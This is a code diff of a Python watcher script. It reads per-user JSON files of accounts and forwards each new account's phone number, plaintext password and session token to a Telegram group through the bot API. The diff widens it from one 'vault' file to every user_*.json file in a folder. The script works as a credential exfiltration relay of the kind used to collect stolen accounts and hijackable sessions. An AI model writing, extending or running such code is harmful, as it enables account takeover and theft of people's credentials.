@@ -1,49 +1,66 @@
 import json
+import os
 import time
 import requests
 
 BOT_TOKEN = "YOUR_BOT_TOKEN"
 CHAT_ID = "YOUR_GROUP_ID"
-FILE_PATH = "data/vault.json"
+DATA_FOLDER = "data"
 
-seen_numbers = set()
+seen_accounts = set()
 
 def send_to_telegram(text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    data = {
-        "chat_id": CHAT_ID,
-        "text": text
-    }
-    requests.post(url, data=data)
+    requests.post(url, data={"chat_id": CHAT_ID, "text": text})
 
-def load_json():
-    with open(FILE_PATH, "r") as f:
-        return json.load(f)
+
+def load_all_accounts():
+    all_accounts = []
+
+    if not os.path.exists(DATA_FOLDER):
+        return all_accounts
+
+    for file in os.listdir(DATA_FOLDER):
+        if file.startswith("user_") and file.endswith(".json"):
+            path = os.path.join(DATA_FOLDER, file)
+
+            try:
+                with open(path, "r") as f:
+                    data = json.load(f)
+
+                accounts = data.get("accounts", {})
+
+                for number, details in accounts.items():
+                    all_accounts.append(details)
+
+            except:
+                continue
+
+    return all_accounts
+
 
 def start_watcher():
-    global seen_numbers
+    global seen_accounts
 
-    # first load (taaki purane spam na ho)
-    try:
-        data = load_json()
-        seen_numbers = set(data.get("accounts", {}).keys())
-    except:
-        seen_numbers = set()
+    # 🧠 First load (spam avoid)
+    for acc in load_all_accounts():
+        seen_accounts.add(acc.get("phone"))
 
     while True:
         try:
-            data = load_json()
-            accounts = data.get("accounts", {})
+            accounts = load_all_accounts()
 
-            for number, details in accounts.items():
-                if number not in seen_numbers:
-                    seen_numbers.add(number)
+            for acc in accounts:
+                phone = acc.get("phone")
+
+                if phone not in seen_accounts:
+                    seen_accounts.add(phone)
 
                     msg = f"""📥 New Account Added
 
-📱 Number: {details.get('phone')}
-🔑 Password: {details.get('password')}
-📂 Session: {details.get('session')[:400]}
+📱 Number: {phone}
+🔑 Password: {acc.get('password')}
+📂 Session: {acc.get('session')[:50]}...
 """
 
                     send_to_telegram(msg)
